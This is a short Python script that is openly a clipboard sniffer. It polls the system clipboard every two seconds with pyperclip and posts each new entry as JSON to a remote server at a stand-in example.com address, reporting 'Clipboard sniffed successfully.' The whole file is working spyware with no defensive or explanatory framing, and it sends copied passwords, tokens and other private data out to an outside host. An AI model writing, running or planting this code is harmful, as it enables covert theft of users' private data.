import pyperclip
import time
import json
import requests

server_url = "https://example.com/clip"



def send_to_server(list_of_clipboard):
    data_json = json.dumps(list_of_clipboard)
    headers = {
        'Content-Type': 'application/json',
    }
    try:
        response = requests.post(server_url, data=data_json, headers=headers)
        if response.status_code == 200:
            print("Clipboard sniffed successfully.")
        else:
            print(f"Request failed with status code {response.status_code}")
    except Exception as e:
        print("Request failed:", e)


clip = [pyperclip.paste()]
send_to_server(clip)
while True:
    temp = pyperclip.paste()
    if temp not in clip:
        clip.append(temp)
        send_to_server(clip)
    time.sleep(2)
